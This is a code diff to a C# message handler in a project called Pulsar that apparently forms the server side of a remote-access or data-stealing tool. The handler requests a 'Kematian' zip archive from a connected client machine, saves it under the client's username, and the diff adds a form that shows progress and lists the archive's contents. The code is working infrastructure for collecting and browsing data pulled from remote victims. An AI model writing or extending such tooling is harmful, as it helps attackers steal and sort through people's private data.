@@ -1,16 +1,14 @@
-﻿using Pulsar.Common.Helpers;
-using Pulsar.Common.Messages;
-using Pulsar.Common.Models;
+﻿using Pulsar.Common.Messages;
 using Pulsar.Common.Networking;
-using Pulsar.Server.Models;
 using Pulsar.Server.Networking;
 using System;
 using System.IO;
-using System.IO.Compression;
 using System.Windows.Forms;
 using System.Diagnostics;
 using Pulsar.Common.Messages.Monitoring.Kematian;
 using Pulsar.Common.Messages.other;
+using Pulsar.Server.Forms;
+using System.Threading.Tasks;
 
 namespace Pulsar.Server.Messages
 {
@@ -20,6 +18,8 @@ namespace Pulsar.Server.Messages
     public class KematianHandler : MessageProcessorBase<string>, IDisposable
     {
         private readonly Client _client;
+        private FrmKematian _kematianForm;
+        private string _currentZip;
 
         public KematianHandler(Client client) : base(true)
         {
@@ -27,45 +27,91 @@ namespace Pulsar.Server.Messages
             MessageHandler.Register(this);
         }
 
-        public override bool CanExecute(IMessage message) => message is GetKematian;
+        public override bool CanExecute(IMessage message) => message is GetKematian || message is SetKematianStatus;
 
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
 
         public override void Execute(ISender sender, IMessage message)
         {
-            if (message is GetKematian zipMessage)
+            switch (message)
             {
+                case GetKematian zipMessage:
+                    HandleGetKematian(zipMessage);
+                    break;
+                case SetKematianStatus statusMessage:
+                    HandleSetKematianStatus(statusMessage);
+                    break;
+            }
+        }
 
-                //public string DownloadDirectory => _downloadDirectory ?? (_downloadDirectory = (!FileHelper.HasIllegalCharacters(UserAtPc))
-                //                       ? Path.Combine(Application.StartupPath, $"Clients\\{UserAtPc}_{Id.Substring(0, 7)}\\")
-                //                       : Path.Combine(Application.StartupPath, $"Clients\\{Id}\\"));
-                string outPath = Path.Combine(Application.StartupPath, "Kematian");
+        private void HandleGetKematian(GetKematian zipMessage)
+        {
+            string outPath = Path.Combine(Application.StartupPath, "Kematian");
 
-                if (!Directory.Exists(outPath))
-                {
-                    Directory.CreateDirectory(outPath);
-                }
-
-                string writePath = Path.Combine(outPath, $"{_client.Value.Username}_Kematian.zip");
-
-                try
-                {
-                    File.WriteAllBytes(writePath, zipMessage.ZipFile);
-                    System.Diagnostics.Process.Start(writePath);
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine(ex.Message);
-                }
+            if (!Directory.Exists(outPath))
+            {
+                Directory.CreateDirectory(outPath);
             }
 
-            Dispose(); // we only want to receive the zip file once then we can fucking kill the handler like a real programmer
+            string writePath = Path.Combine(outPath, $"{_client.Value.Username}_Kematian.zip");
+            _currentZip = writePath;
+
+            try
+            {
+                File.WriteAllBytes(writePath, zipMessage.ZipFile);
+                
+                if (_kematianForm != null && !_kematianForm.IsDisposed)
+                {
+                    Task.Run(() => {
+                        _kematianForm.UpdateStatus(Common.Enums.KematianStatus.Completed);
+                        _kematianForm.UpdateProgress(100);
+                        _kematianForm.SetZipReadyStatus();
+                        _kematianForm.DisplayZipContents(writePath);
+                    });
+                }
+                else
+                {
+                    System.Diagnostics.Process.Start(writePath);
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine(ex.Message);
+                if (_kematianForm != null && !_kematianForm.IsDisposed)
+                {
+                    _kematianForm.UpdateStatus(Common.Enums.KematianStatus.Failed);
+                }
+            }
+        }
+        
+        private void HandleSetKematianStatus(SetKematianStatus statusMessage)
+        {
+            if (_kematianForm != null && !_kematianForm.IsDisposed)
+            {
+                _kematianForm.UpdateStatus(statusMessage.Status);
+                _kematianForm.UpdateProgress(statusMessage.Percentage);
+                
+                if (statusMessage.Status == Common.Enums.KematianStatus.Completed)
+                {
+                    _kematianForm.SetZipReadyStatus();
+                }
+            }
         }
 
         public void RequestKematianZip()
         {
             var request = new GetKematian();
             _client.Send(request);
+        }
+        
+        public void SetKematianForm(FrmKematian form)
+        {
+            _kematianForm = form;
+            
+            if (_kematianForm != null && !string.IsNullOrEmpty(_currentZip) && File.Exists(_currentZip))
+            {
+                Task.Run(() => _kematianForm.DisplayZipContents(_currentZip));
+            }
         }
 
         public void Dispose()
